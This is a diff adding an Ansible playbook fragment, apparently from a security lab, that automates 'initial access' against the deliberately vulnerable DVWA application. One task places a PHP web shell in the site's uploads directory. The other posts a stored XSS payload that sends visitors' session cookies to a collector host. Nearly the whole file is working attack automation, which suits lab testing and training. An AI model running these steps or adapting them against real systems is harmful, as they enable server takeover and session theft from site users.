@@ -1,0 +1,14 @@
+---
+- name: PoC3 Initial Access – Upload web shell
+  template:
+    src: webshell.php.j2
+    dest: /var/www/html/DVWA/hackable/uploads/shell.php
+    mode: '0755'
+  delegate_to: "{{ groups['web-victim'][0] }}"
+
+- name: PoC3 Initial Access – Inject XSS payload
+  shell: |
+    curl -X POST "http://{{ web_victim_ip }}/DVWA/vulnerabilities/xss_s/" \
+    -d "txtName=Hybrid&mtxMessage=<script>new Image().src='http://{{ collector_ip }}:8080/?c='+document.cookie</script>&btnSign=Sign Guestbook" \
+    --cookie "security=low; PHPSESSID=dummy"
+  failed_when: false
